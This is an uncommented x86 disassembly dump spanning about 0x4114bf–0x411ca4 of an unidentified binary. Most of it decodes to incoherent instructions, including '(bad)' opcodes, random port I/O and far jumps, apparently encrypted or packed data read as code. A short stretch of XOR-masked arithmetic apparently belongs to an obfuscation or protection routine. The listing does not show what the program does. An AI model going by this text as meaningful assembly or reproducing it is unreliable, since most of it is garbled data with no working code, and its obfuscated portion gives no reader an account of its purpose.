  4114bf:	jle    0x41150a
  4114c1:	neg    dl
  4114c3:	or     eax,0x4dfa6848
  4114c8:	ins    DWORD PTR es:[edi],dx
  4114c9:	test   BYTE PTR [esi+0x44],al
  4114cc:	outs   dx,DWORD PTR ds:[esi]
  4114cd:	cli    
  4114ce:	imul   edi,DWORD PTR [edx-0x792a2dea],0xffffffbb
  4114d5:	adc    DWORD PTR gs:[esi+0x4b457e14],ecx
  4114dc:	jp     0x41146f
  4114de:	inc    ebp
  4114df:	sub    ecx,ebx
  4114e1:	mov    ds:0xe57220e5,al
  4114e6:	sub    ebx,DWORD PTR [edi+esi*1+0x40763724]
  4114ed:	inc    ecx
  4114ee:	int    0x1b
  4114f0:	sbb    edi,eax
  4114f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114f3:	les    edx,FWORD PTR [edx-0x59]
  4114f6:	push   esp
  4114f7:	xor    BYTE PTR ds:0xfd51fa20,ah
  4114fd:	push   ebp
  4114fe:	cdq    
  4114ff:	sbb    ecx,0x34
  411502:	push   eax
  411503:	add    BYTE PTR cs:[esi-0x77],dl
  411507:	repz pop ebx
  411509:	xchg   ebx,eax
  41150a:	aad    0x51
  41150c:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41150e:	aad    0xcb
  411510:	stos   DWORD PTR es:[edi],eax
  411511:	mov    edi,0xd5aee72e
  411516:	pop    ds
  411517:	stos   DWORD PTR es:[edi],eax
  411518:	pop    edi
  411519:	jp     0x4114a8
  41151b:	or     al,0x3f
  41151d:	lods   al,BYTE PTR ds:[esi]
  41151e:	or     ebp,DWORD PTR [edx]
  411520:	cmp    edx,DWORD PTR [eax]
  411522:	jmp    0x4114f8
  411524:	jne    0x41154c
  411526:	test   BYTE PTR [eax+edx*4-0x1a047c74],ah
  41152d:	test   ch,dl
  41152f:	aas    
  411530:	into   
  411531:	shl    BYTE PTR [edx+eiz*4-0x71d9fe8],1
  411538:	mov    ds:0x6e1baa6b,al
  41153d:	push   esi
  41153e:	mov    ebx,0x200227d
  411543:	pop    ebx
  411544:	cs fwait
  411546:	imul   esi,edi,0xffffffc6
  411549:	dec    eax
  41154a:	in     eax,dx
  41154b:	adc    dl,BYTE PTR [edi-0x5b2e6e78]
  411551:	mov    al,0xcf
  411553:	rcr    DWORD PTR [ecx+0x4f],0x88
  411557:	sub    ch,BYTE PTR [edx-0x6b]
  41155a:	xchg   ebp,eax
  41155b:	retf   0x20fb
  41155e:	test   DWORD PTR [edi+0x5fdd73d2],edi
  411564:	jbe    0x41158b
  411566:	jne    0x411594
  411568:	xlat   BYTE PTR ds:[ebx]
  411569:	pop    esp
  41156a:	mov    bh,BYTE PTR [edx+ebx*2-0x2a]
  41156e:	mov    ebx,0x379bd5f5
  411573:	mov    ebp,0x82532d19
  411578:	ja     0x4115ed
  41157a:	out    0x8b,al
  41157c:	or     eax,0x9df045ae
  411581:	jb     0x4115b7
  411583:	cmp    al,0x36
  411585:	popf   
  411586:	or     DWORD PTR [edi+0x23dca291],eax
  41158c:	jmp    0x599d:0x17071ae4
  411593:	nop
  411594:	imul   edi,DWORD PTR [ecx+0x13],0x16eeb9a1
  41159b:	cmp    ecx,DWORD PTR [edi+0x4a]
  41159e:	jno    0x41160a
  4115a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115a1:	(bad)  
  4115a2:	and    al,0xf3
  4115a4:	pop    edi
  4115a5:	add    bl,BYTE PTR ss:[edi]
  4115a8:	clc    
  4115a9:	enter  0x5f7a,0x60
  4115ad:	ret    0x6f50
  4115b0:	aas    
  4115b1:	nop
  4115b2:	push   ss
  4115b3:	pop    ebp
  4115b5:	div    DWORD PTR [ebp+0x6]
  4115b8:	or     edi,DWORD PTR [edx]
  4115ba:	fstp   st(6)
  4115bc:	sub    al,0xea
  4115be:	push   edx
  4115bf:	dec    edi
  4115c0:	test   eax,ebp
  4115c2:	inc    edi
  4115c3:	inc    esi
  4115c4:	leave  
  4115c5:	pop    esp
  4115c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115c7:	adc    eax,0xdd671f7e
  4115cc:	mov    ds:0x8cd38fff,al
  4115d1:	lahf   
  4115d2:	repnz add al,0x55
  4115d5:	shr    DWORD PTR [eax+0x35],1
  4115d8:	adc    eax,0x84aaa6d2
  4115dd:	sbb    al,0xe1
  4115df:	xor    esp,edx
  4115e1:	inc    eax
  4115e2:	or     esp,esp
  4115e4:	(bad)  
  4115e5:	sub    eax,0x58b391c1
  4115ea:	(bad)  
  4115eb:	xchg   esi,eax
  4115ec:	repz not BYTE PTR [edi]
  4115ef:	loopne 0x41165d
  4115f1:	mov    BYTE PTR ds:0xee53e4b1,0x7e
  4115f8:	cwde   
  4115f9:	inc    ebp
  4115fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115fb:	pop    es
  4115fc:	xchg   ecx,ebp
  4115fe:	or     BYTE PTR [eax+eiz*2],bh
  411601:	aaa    
  411602:	ja     0x411592
  411604:	fiadd  WORD PTR [ebp+ebx*2-0x7aab40b5]
  41160b:	test   edx,esp
  41160d:	xchg   BYTE PTR [ebp-0x459247ca],cl
  411613:	add    esi,esi
  411615:	dec    eax
  411616:	fst    st(3)
  411618:	leave  
  411619:	fucomi st,st(2)
  41161b:	or     ecx,DWORD PTR [eax-0x1f9d64b5]
  411621:	pop    ds
  411622:	jmp    0x4115f2
  411624:	jle    0x41160d
  411626:	mov    dh,0x79
  411628:	jnp    0x41164d
  41162a:	mov    edx,0x39a2a1e8
  41162f:	das    
  411630:	cmc    
  411631:	outs   dx,BYTE PTR ds:[esi]
  411632:	neg    edx
  411634:	jnp    0x41161d
  411636:	test   DWORD PTR [edi+0x18eaebd1],eax
  41163c:	jno    0x4116b9
  41163e:	std    
  41163f:	inc    ebp
  411640:	cs and al,0x7c
  411643:	cli    
  411644:	loopne 0x4116ad
  411646:	and    edx,DWORD PTR [edi+0x5a]
  411649:	mov    eax,0xb4452a45
  41164e:	lds    edi,FWORD PTR [esi-0x57d8b851]
  411654:	pusha  
  411655:	ror    BYTE PTR [edx],1
  411657:	aad    0x2c
  411659:	sti    
  41165a:	mov    al,ds:0xe351fbc6
  41165f:	mov    esp,0x6a3c8469
  411664:	jmp    0x411632
  411666:	call   0xb58c:0x93357500
  41166d:	xchg   ebx,eax
  41166e:	mov    bh,0xe0
  411670:	adc    DWORD PTR [eax-0x79],esp
  411673:	jmp    0x7037:0xe5530934
  41167a:	outs   dx,DWORD PTR ds:[esi]
  41167b:	add    eax,0x870dd31b
  411680:	aad    0x1b
  411682:	int3   
  411683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411684:	add    al,BYTE PTR [edx-0x713e57c3]
  41168a:	fimul  DWORD PTR [edi+ecx*4-0x48]
  41168e:	mov    ebp,0x1ef9c739
  411693:	retf   0xf21e
  411696:	scas   al,BYTE PTR es:[edi]
  411697:	dec    edx
  411698:	adc    al,0xd4
  41169a:	in     al,dx
  41169b:	retf   0xcc0
  41169e:	aaa    
  41169f:	push   0x59
  4116a1:	dec    eax
  4116a2:	outs   dx,DWORD PTR ds:[esi]
  4116a3:	cmp    DWORD PTR [edi-0x79],esp
  4116a6:	jo     0x4116df
  4116a8:	mov    DWORD PTR [edx-0x5c7adea5],0xf0224eb2
  4116b2:	loopne 0x411686
  4116b4:	test   DWORD PTR [edx+ecx*1-0x19aabe90],edx
  4116bb:	retf   0xa26f
  4116be:	and    al,0x5c
  4116c0:	fsubr  QWORD PTR [ecx-0xc7bec6b]
  4116c6:	adc    DWORD PTR [ebx+eiz*2-0x7f],0x1ff79bae
  4116ce:	adc    al,0xe2
  4116d0:	ds or  edx,edx
  4116d3:	add    eax,0xf244dc7a
  4116d8:	mov    ds:0x7a471fa0,eax
  4116dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116de:	jbe    0x411697
  4116e0:	mov    DWORD PTR [esi+0x1fc3d805],esi
  4116e6:	stc    
  4116e7:	lods   al,BYTE PTR ds:[esi]
  4116e8:	fwait
  4116e9:	mov    edi,0x52587efe
  4116ee:	lods   al,BYTE PTR ds:[esi]
  4116ef:	cmp    al,0x99
  4116f1:	std    
  4116f2:	and    eax,0x8b3e639f
  4116f7:	xchg   esi,eax
  4116f8:	lds    ecx,FWORD PTR [edi+0x1c]
  4116fb:	rcr    DWORD PTR [edi],cl
  4116fd:	nop
  4116fe:	jmp    0x757b4426
  411703:	pop    es
  411704:	outs   dx,BYTE PTR ds:[esi]
  411705:	dec    edx
  411706:	das    
  411707:	mov    esi,0x346b02c7
  41170c:	daa    
  41170d:	cmp    eax,0x6fae495f
  411712:	or     bh,BYTE PTR [eax]
  411714:	and    DWORD PTR [ebp+0xf],esi
  411717:	xchg   esi,eax
  411718:	sbb    ch,bh
  41171a:	in     al,0x2f
  41171c:	out    dx,eax
  41171d:	cmp    DWORD PTR [ebp-0x3e96421e],edi
  411723:	int3   
  411724:	imul   ebp,ecx,0xffffffc1
  411727:	int3   
  411728:	inc    esi
  411729:	(bad)  
  41172a:	fiadd  DWORD PTR [esi+ebp*1+0x10]
  41172e:	mov    al,0x3
  411730:	dec    edi
  411731:	cs icebp 
  411733:	sar    BYTE PTR [eax-0x9787004],cl
  411739:	loop   0x4116e1
  41173b:	jg     0x41177e
  41173d:	pop    es
  41173e:	xchg   edx,eax
  41173f:	stos   DWORD PTR es:[edi],eax
  411740:	es push 0xfbb5f82c
  411746:	lahf   
  411747:	adc    eax,0x3a41242a
  41174c:	push   ds
  41174d:	push   ds
  41174e:	outs   dx,DWORD PTR ds:[esi]
  41174f:	xchg   esp,eax
  411750:	push   ecx
  411751:	sbb    BYTE PTR [ebx],0xff
  411754:	dec    ecx
  411755:	push   edx
  411756:	jmp    0x411740
  411758:	mov    ebp,0x76d798fd
  41175d:	xor    eax,edx
  41175f:	push   ecx
  411760:	jle    0x411744
  411762:	xchg   ebx,ebp
  411764:	aad    0x15
  411766:	fcmovnb st,st(5)
  411768:	ins    BYTE PTR es:[edi],dx
  411769:	and    ch,BYTE PTR [ebx+edi*2]
  41176c:	out    dx,eax
  41176d:	cmp    eax,0xd042999a
  411772:	das    
  411773:	dec    edx
  411774:	xchg   edi,eax
  411775:	idiv   BYTE PTR [edi+edi*8-0x32a24c41]
  41177c:	ror    DWORD PTR [eax+0x78],cl
  41177f:	mov    esi,ds
  411781:	gs or  al,dh
  411784:	dec    ecx
  411785:	pop    es
  411786:	out    0x45,al
  411788:	fiadd  WORD PTR [ebp+0x7f]
  41178b:	push   ebx
  41178c:	(bad)  
  41178d:	int3   
  41178e:	in     eax,dx
  41178f:	fdivr  DWORD PTR [edi]
  411791:	jp     0x41176a
  411793:	lea    esi,[edi-0x7b4120fd]
  411799:	call   0xd2e0f676
  41179e:	test   DWORD PTR [esp],esi
  4117a1:	mov    al,0xed
  4117a3:	(bad)  
  4117a4:	lods   al,BYTE PTR ds:[esi]
  4117a5:	test   al,0xfc
  4117a7:	or     DWORD PTR [edx+ebp*8],0x228d9aba
  4117ae:	stos   DWORD PTR es:[edi],eax
  4117af:	mov    edx,0xf02c2974
  4117b4:	xchg   DWORD PTR [ebx-0x3c3284b8],ecx
  4117ba:	aam    0x75
  4117bc:	fwait
  4117bd:	das    
  4117be:	fld    st(6)
  4117c0:	add    dh,BYTE PTR [ebp-0x4751ab40]
  4117c6:	das    
  4117c7:	mov    bh,0xfe
  4117c9:	pop    es
  4117ca:	xor    al,0x72
  4117cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117cd:	in     al,0x8e
  4117cf:	add    bh,0xdb
  4117d2:	test   BYTE PTR [edx+0x28],dh
  4117d5:	cli    
  4117d6:	mov    ecx,0x56186bd5
  4117db:	sar    BYTE PTR [eax+0x1f],1
  4117de:	xor    eax,0xdb18ab64
  4117e3:	dec    esp
  4117e4:	push   eax
  4117e5:	xor    DWORD PTR [edx+0x11],edi
  4117e8:	add    al,0x59
  4117ea:	out    dx,al
  4117eb:	imul   esp,DWORD PTR gs:[esi+0x2b],0xffffffce
  4117f0:	xor    ecx,eax
  4117f2:	mov    DWORD PTR [ebp+0x8],ecx
  4117f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4117f8:	mov    edx,DWORD PTR [ebp+0x8]
  4117fb:	imul   edx,edx,0x5708f1
  411801:	xor    ecx,eax
  411803:	add    ecx,esi
  411805:	lea    ecx,[ebp+ecx*4-0x64]
  411809:	mov    edi,DWORD PTR [ecx]
  41180b:	add    edx,edi
  41180d:	mov    DWORD PTR [ecx],edx
  41180f:	mov    ecx,DWORD PTR [ebp+0x8]
  411812:	xor    ecx,eax
  411814:	add    ecx,esi
  411816:	jne    0x40f45a
  41181c:	jmp    0x413bef
  411821:	mov    ecx,DWORD PTR [ebp+0x8]
  411824:	mov    edx,DWORD PTR [ebp-0x8]
  411827:	xor    ecx,eax
  411829:	xor    edx,eax
  41182b:	sub    ecx,edx
  41182d:	sub    ecx,esi
  41182f:	xor    ecx,eax
  411831:	mov    DWORD PTR [ebp+0x8],ecx
  411834:	mov    ecx,DWORD PTR [ebp+0x8]
  411837:	mov    edx,DWORD PTR [ebp+0x8]
  41183a:	xor    ecx,eax
  41183c:	imul   edx,edx,0x5708f1
  411842:	add    ecx,esi
  411844:	lea    ecx,[ebp+ecx*4-0x64]
  411848:	mov    edi,DWORD PTR [ecx]
  41184a:	add    edx,edi
  41184c:	mov    DWORD PTR [ecx],edx
  41184e:	mov    ecx,DWORD PTR [ebp+0x8]
  411851:	xor    ecx,eax
  411853:	add    ecx,esi
  411855:	jne    0x411821
  41185b:	jmp    0x413be3
  411860:	ins    BYTE PTR es:[edi],dx
  411861:	jns    0x4117f2
  411863:	sbb    edi,DWORD PTR [ebx+0x1b]
  411866:	mov    eax,0xa6df667b
  41186b:	push   edi
  41186c:	sub    DWORD PTR [edx+esi*4+0xd],ebx
  411870:	call   0x7bd9505
  411875:	pop    edi
  411876:	jl     0x4118f4
  411878:	dec    ecx
  411879:	xchg   edx,eax
  41187a:	xor    al,0x6
  41187c:	inc    edx
  41187d:	xchg   esi,eax
  41187e:	xchg   edx,eax
  41187f:	dec    ecx
  411880:	loopne 0x4118c6
  411882:	push   ss
  411883:	ffree  st(4)
  411885:	addr16 pop ds
  411887:	dec    esp
  411888:	stos   DWORD PTR es:[edi],eax
  411889:	in     al,0x9f
  41188b:	in     al,0xf0
  41188d:	mov    ebp,DWORD PTR [ecx-0x7]
  411890:	fdivr  QWORD PTR [eax+0x30]
  411893:	jo     0x4118bf
  411895:	sub    BYTE PTR [ecx-0x248f29be],dl
  41189b:	popf   
  41189c:	jo     0x4118e4
  41189e:	dec    edx
  41189f:	jmp    0xdd62780c
  4118a4:	aam    0xd6
  4118a6:	jmp    0x7a73:0x4ef84305
  4118ad:	xchg   ebp,eax
  4118ae:	pushf  
  4118af:	mov    BYTE PTR [ebx+eax*4+0x7e68c4c6],dh
  4118b6:	outs   dx,DWORD PTR ds:[esi]
  4118b7:	mov    ds:0xe1295b4c,al
  4118bc:	lock cmp dh,bh
  4118bf:	cwde   
  4118c0:	and    edi,0x3dd0bf9e
  4118c6:	cli    
  4118c7:	mov    bh,0x39
  4118c9:	sub    ebp,DWORD PTR [eax-0x78cee55]
  4118cf:	std    
  4118d0:	cld    
  4118d1:	imul   DWORD PTR [ebp-0x19]
  4118d4:	adc    DWORD PTR [ebx+ebp*8],eax
  4118d7:	xchg   ebp,eax
  4118d8:	xchg   BYTE PTR [ebx+0x212a2761],dh
  4118de:	stos   DWORD PTR es:[edi],eax
  4118df:	shr    BYTE PTR [ebx],cl
  4118e1:	dec    ebx
  4118e2:	into   
  4118e3:	and    ah,BYTE PTR [esi+0x3ed066]
  4118e9:	jo     0x411942
  4118eb:	pop    ecx
  4118ec:	mov    esp,0xb8ecf5a
  4118f1:	aas    
  4118f2:	stc    
  4118f3:	xchg   edx,eax
  4118f4:	loop   0x411934
  4118f6:	fmul   QWORD PTR [ecx-0x53]
  4118f9:	push   ss
  4118fa:	(bad)  
  4118fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118fc:	punpckldq mm3,mm6
  4118ff:	add    edx,0xffffffa5
  411902:	or     ebp,DWORD PTR [eax+0x5d1788a1]
  411908:	je     0x4118de
  41190a:	and    al,0xcb
  41190c:	jp     0x4118ad
  41190e:	aad    0xff
  411910:	fidivr WORD PTR [ebx+edx*8+0x3e]
  411914:	cwde   
  411915:	sbb    edx,DWORD PTR [eax-0x32]
  411918:	cmp    DWORD PTR [ebp+edx*2+0x3d],0x5c7584f4
  411920:	or     eax,0xc3231c7b
  411925:	and    edi,eax
  411927:	sbb    DWORD PTR [ebp-0x27],0xfa7b8622
  41192e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41192f:	lds    ecx,FWORD PTR [edi-0x66]
  411932:	xor    DWORD PTR [eax],edx
  411934:	mov    ds:0x44c1e71f,al
  411939:	out    0xd0,al
  41193b:	in     al,0x95
  41193d:	add    ecx,esi
  41193f:	loope  0x41190d
  411941:	adc    DWORD PTR [ecx+0x5a],esp
  411944:	xchg   edi,eax
  411945:	iret   
  411946:	and    al,0xe3
  411948:	addr16 sar esp,1
  41194b:	push   ss
  41194c:	ffree  st(0)
  41194e:	adc    bl,bl
  411950:	adc    bh,cl
  411952:	mov    esp,0x1974f23c
  411957:	dec    edx
  411958:	iret   
  411959:	cld    
  41195a:	inc    ebx
  41195b:	mov    ecx,0xe396bf8a
  411961:	push   edi
  411962:	push   ds
  411963:	mov    esi,0x778a775d
  411968:	out    dx,al
  411969:	pop    esi
  41196a:	sti    
  41196b:	mov    esp,0x71066280
  411970:	or     bh,BYTE PTR [edi-0x1]
  411973:	popa   
  411974:	mov    cs,WORD PTR [edi+0x13c27911]
  41197a:	ds ss add eax,0x9ec064e8
  411981:	add    DWORD PTR [ebp+ebp*4-0x56],0x162b4f52
  411989:	mov    dh,0x1c
  41198b:	jge    0x4119a3
  41198d:	(bad)  
  41198e:	push   edi
  41198f:	mov    WORD PTR [edi],cs
  411991:	nop
  411992:	pop    ecx
  411993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411994:	ret    0x6529
  411997:	and    ch,BYTE PTR [edi]
  411999:	enter  0xa277,0x17
  41199d:	add    bl,ah
  41199f:	sti    
  4119a0:	fwait
  4119a1:	leave  
  4119a2:	fsub   DWORD PTR [esi-0x5945191e]
  4119a8:	fwait
  4119a9:	pop    eax
  4119aa:	ror    DWORD PTR [ebx],1
  4119ac:	xchg   ecx,eax
  4119ad:	mov    ecx,DWORD PTR [edi+0xb]
  4119b0:	add    BYTE PTR [edi+0x16],bl
  4119b3:	jae    0x41198e
  4119b5:	aam    0x79
  4119b7:	mov    BYTE PTR [edi+0x4fc515a2],dh
  4119bd:	push   ebx
  4119be:	jg     0x4119bd
  4119c0:	sub    cl,BYTE PTR [ebx+0x6d]
  4119c3:	sub    eax,0x12192ee3
  4119c8:	(bad)  
  4119c9:	jmp    0xff6b1824
  4119ce:	dec    ebp
  4119cf:	pop    edx
  4119d0:	retf   
  4119d1:	jnp    0x411998
  4119d3:	add    eax,0x56402801
  4119d8:	pop    ebx
  4119d9:	nop
  4119da:	sub    esi,eax
  4119dc:	xchg   DWORD PTR [edx-0x564af7a],esp
  4119e2:	mov    edi,0xeda4fe53
  4119e7:	leave  
  4119e8:	push   0xfffffff7
  4119ea:	lds    ebp,FWORD PTR ss:[ebx]
  4119ed:	int3   
  4119ee:	addr16 mov esp,0x78948701
  4119f4:	aas    
  4119f5:	pushf  
  4119f6:	add    ecx,eax
  4119f8:	call   0xe564:0x34eea4a
  4119ff:	sbb    BYTE PTR [edi+0x1888077d],bl
  411a05:	ins    BYTE PTR es:[edi],dx
  411a06:	xchg   edx,eax
  411a07:	lods   eax,DWORD PTR ds:[esi]
  411a08:	cmp    al,0xe5
  411a0a:	sahf   
  411a0b:	and    edi,edi
  411a0d:	cld    
  411a0e:	push   cs
  411a0f:	(bad)  
  411a11:	lods   eax,DWORD PTR ds:[esi]
  411a12:	test   eax,ebx
  411a14:	and    BYTE PTR [esi+0x129376eb],al
  411a1a:	sub    eax,0x9a97dfe1
  411a1f:	aaa    
  411a20:	ins    DWORD PTR es:[edi],dx
  411a21:	int3   
  411a22:	inc    edi
  411a23:	ins    BYTE PTR es:[edi],dx
  411a24:	call   0xac92:0xa7abab27
  411a2b:	sbb    al,0x95
  411a2d:	mov    ds:0xa2cdc7ef,al
  411a32:	push   0x6eb5b6da
  411a37:	and    BYTE PTR [esp+ecx*4],dl
  411a3a:	jo     0x4119e0
  411a3c:	mov    eax,ds:0x600f77c5
  411a41:	jnp    0x4119c9
  411a43:	int    0xf
  411a45:	out    dx,eax
  411a46:	and    eax,edi
  411a48:	pop    edx
  411a49:	jb     0x411a68
  411a4b:	sbb    al,0x6e
  411a4d:	add    BYTE PTR [edx+0x23],bl
  411a50:	out    0x63,eax
  411a52:	push   ecx
  411a53:	mov    DWORD PTR [esp+ecx*8+0x25],0xd6f3fa21
  411a5b:	das    
  411a5c:	or     BYTE PTR [eax-0x40],bh
  411a5f:	jl     0x411ad5
  411a61:	mov    edi,ebx
  411a63:	mov    cl,0x5a
  411a65:	icebp  
  411a66:	scas   eax,DWORD PTR es:[edi]
  411a67:	mov    ebx,0xdadc354d
  411a6c:	stc    
  411a6d:	jp     0x411aa4
  411a6f:	out    dx,al
  411a70:	mov    al,ds:0xb5766590
  411a75:	jl     0x411aa1
  411a77:	dec    ebx
  411a78:	fisttp DWORD PTR [esi+0x34b49517]
  411a7e:	test   al,0xe1
  411a80:	loopne 0x411af9
  411a82:	or     eax,0x662338cd
  411a87:	mov    edx,0x1fa673b0
  411a8c:	sub    ecx,ebx
  411a8e:	enter  0x91a7,0x28
  411a92:	and    bh,BYTE PTR [eax-0x49f0f887]
  411a98:	cld    
  411a99:	(bad)  
  411a9b:	mov    ecx,ecx
  411a9d:	data16 xor bl,BYTE PTR [ebx]
  411aa0:	loopne 0x411a53
  411aa2:	and    ah,dh
  411aa4:	inc    ebp
  411aa5:	call   0x2efc:0x4dc170
  411aac:	lods   eax,DWORD PTR ds:[esi]
  411aad:	loop   0x411b2d
  411aaf:	call   0x2f8d5017
  411ab4:	or     al,0x82
  411ab6:	repnz repz loopne 0x411a6c
  411aba:	icebp  
  411abb:	sub    DWORD PTR [edx+0x4f6204c3],esi
  411ac1:	out    dx,eax
  411ac2:	fistp  DWORD PTR [ebx-0x404d3ee2]
  411ac8:	and    DWORD PTR [esi-0x3b01b1f3],0x1d
  411acf:	ffree  st(3)
  411ad1:	adc    eax,0x52a33e22
  411ad6:	mov    DWORD PTR [eax],ebx
  411ad8:	add    bh,BYTE PTR [edi]
  411ada:	retf   0x9815
  411add:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ade:	iret   
  411adf:	mov    dh,0x14
  411ae1:	mov    BYTE PTR [ebp-0x4],ah
  411ae4:	aaa    
  411ae5:	dec    ebx
  411ae6:	jl     0xc501bb52
  411aec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411aed:	rol    BYTE PTR [ecx+0x503e6f6e],1
  411af3:	fwait
  411af4:	xchg   ebx,eax
  411af5:	adc    al,0x9f
  411af7:	daa    
  411af8:	pop    esi
  411af9:	push   ebp
  411afa:	clc    
  411afb:	jbe    0x411ab5
  411afd:	mov    esp,DWORD PTR [eax+0x1a]
  411b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b01:	mov    edi,0x10b16772
  411b06:	cwde   
  411b07:	push   ss
  411b08:	mov    bh,0xf5
  411b0a:	jmp    0x8851de12
  411b0f:	mov    ecx,0xb0199b52
  411b14:	stos   BYTE PTR es:[edi],al
  411b15:	mov    ch,0x38
  411b17:	leave  
  411b18:	daa    
  411b19:	jne    0x411aba
  411b1b:	enter  0xa707,0x6e
  411b1f:	mov    esi,0xbb132261
  411b24:	pop    ecx
  411b25:	dec    ebx
  411b26:	loopne 0x411b58
  411b28:	jl     0x411b67
  411b2a:	mov    al,BYTE PTR [esi-0x30]
  411b2d:	test   al,0x99
  411b2f:	shr    DWORD PTR [esi-0x373bd796],0xe1
  411b36:	inc    edi
  411b37:	ss stos BYTE PTR es:[edi],al
  411b39:	push   ss
  411b3a:	loope  0x411acb
  411b3c:	inc    esp
  411b3d:	add    DWORD PTR [edi+0x1132c282],edx
  411b43:	call   0x826b0d93
  411b48:	in     al,dx
  411b49:	ret    0xaed1
  411b4c:	test   eax,0x93a1e929
  411b51:	inc    edx
  411b52:	test   BYTE PTR [ebx-0x618b39cf],dl
  411b58:	mov    dl,0x8c
  411b5a:	pop    es
  411b5b:	(bad)  
  411b5c:	in     eax,dx
  411b5d:	stc    
  411b5e:	dec    eax
  411b5f:	dec    ebx
  411b60:	lock or eax,0x69b0aa97
  411b66:	les    edi,FWORD PTR [edi+0x5092db04]
  411b6c:	loope  0x411b91
  411b6e:	ficom  DWORD PTR [ecx+0x6e8bda69]
  411b74:	je     0x411b95
  411b76:	inc    ebp
  411b77:	(bad)
  411b7a:	(bad)  
  411b7b:	xchg   esi,eax
  411b7c:	push   ebx
  411b7d:	jle    0x411b4f
  411b7f:	push   ss
  411b80:	loop   0x411bb0
  411b82:	scas   eax,DWORD PTR es:[edi]
  411b83:	inc    edx
  411b84:	fst    QWORD PTR [edx+ebp*2]
  411b87:	mov    cl,0x73
  411b89:	test   dh,cl
  411b8b:	iret   
  411b8c:	out    0x68,al
  411b8e:	outs   dx,DWORD PTR ds:[esi]
  411b8f:	cmp    BYTE PTR [eax-0x396704e2],dh
  411b95:	cmp    cl,BYTE PTR [ebx-0x4806b7]
  411b9b:	pushf  
  411b9c:	jno    0x411b89
  411b9e:	dec    eax
  411b9f:	out    0x9b,eax
  411ba1:	mov    ecx,0x9c0d6a6
  411ba6:	dec    ebx
  411ba7:	aas    
  411ba8:	sub    DWORD PTR [esi-0x2a],eax
  411bab:	stos   DWORD PTR es:[edi],eax
  411bac:	in     al,dx
  411bad:	shl    DWORD PTR [eax-0x14],cl
  411bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bb1:	inc    ecx
  411bb2:	in     al,0xbb
  411bb4:	or     DWORD PTR [ecx+0x29c21ce0],edx
  411bba:	fsubr  st(6),st
  411bbc:	dec    ebp
  411bbd:	iret   
  411bbe:	ja     0x411b8e
  411bc0:	push   ebx
  411bc1:	or     BYTE PTR ds:0x8e0a855e,ah
  411bc7:	sbb    eax,0x6a86b5f7
  411bcc:	mov    BYTE PTR [ecx],ch
  411bce:	adc    DWORD PTR [edx],edi
  411bd0:	pop    ecx
  411bd1:	ror    DWORD PTR ds:0xdab92214,1
  411bd7:	inc    ecx
  411bd8:	out    dx,eax
  411bd9:	jmp    0x1047e714
  411bde:	outs   dx,BYTE PTR ds:[esi]
  411bdf:	or     eax,0x203f77b
  411be4:	ds pop ebx
  411be6:	xchg   ebp,eax
  411be7:	in     eax,dx
  411be8:	or     al,BYTE PTR [eax-0x59f4b9cc]
  411bee:	fwait
  411bef:	jmp    0x411c33
  411bf1:	mov    ah,0x3c
  411bf3:	gs sbb ebx,edi
  411bf6:	adc    ah,BYTE PTR [ebx-0x2e7ae038]
  411bfc:	mov    ?,dx
  411bff:	adc    al,0x12
  411c01:	daa    
  411c02:	jmp    0x411bd9
  411c04:	mov    WORD PTR [edi],es
  411c06:	stos   BYTE PTR es:[edi],al
  411c07:	icebp  
  411c08:	sbb    al,0x1a
  411c0a:	adc    ah,al
  411c0c:	push   esp
  411c0d:	sub    bh,BYTE PTR [edx+ebp*2-0x27]
  411c11:	push   ss
  411c12:	mov    edi,0xaaba17fd
  411c17:	mov    ebp,0x331cd3dd
  411c1c:	iret   
  411c1d:	mov    esi,0x10569543
  411c22:	int    0xb0
  411c24:	fild   QWORD PTR [ebp+0x604591ca]
  411c2a:	repz cdq 
  411c2c:	mov    WORD PTR ds:0x5923281e,ds
  411c32:	rcr    ch,1
  411c34:	mov    ebx,0xac0526a3
  411c39:	shl    DWORD PTR [eax],0x3a
  411c3c:	xor    esi,edx
  411c3e:	das    
  411c3f:	mov    ds:0x59f4910d,al
  411c44:	jmp    0x6197:0x79ffc615
  411c4b:	mov    ebp,0xae3786ee
  411c50:	push   ecx
  411c51:	mov    dh,0x91
  411c53:	int    0x9c
  411c55:	dec    ecx
  411c56:	in     eax,0xb0
  411c58:	and    eax,0x68ceff9f
  411c5d:	mov    ecx,0xce0b0724
  411c62:	adc    dh,BYTE PTR [edx]
  411c64:	push   es
  411c65:	les    edx,FWORD PTR [ebx]
  411c67:	mov    ebp,0xfd90ece
  411c6c:	mov    ah,0xfe
  411c6e:	clc    
  411c6f:	xchg   esp,eax
  411c70:	jbe    0x411caa
  411c72:	mov    ds:0xb28d2d7e,al
  411c77:	in     al,dx
  411c78:	pop    ds
  411c79:	sti    
  411c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c7b:	lahf   
  411c7c:	sbb    al,0x1f
  411c7e:	adc    eax,DWORD PTR [esi-0x55]
  411c81:	adc    esi,DWORD PTR [esi-0x5177a26c]
  411c87:	int3   
  411c88:	hlt    
  411c89:	adc    ah,BYTE PTR [edx-0xb]
  411c8c:	inc    eax
  411c8d:	inc    eax
  411c8e:	push   cs
  411c8f:	and    al,0xfa
  411c91:	(bad)
  411c94:	cmp    ebp,DWORD PTR [ebx+esi*1]
  411c97:	in     eax,0x25
  411c99:	ins    BYTE PTR es:[edi],dx
  411c9a:	xchg   ecx,esp
  411c9c:	ja     0x411c69
  411c9e:	cmp    BYTE PTR [edx+eiz*1-0x4],0x19
  411ca3:	iret   
  411ca4:	push   0x71a98bb3
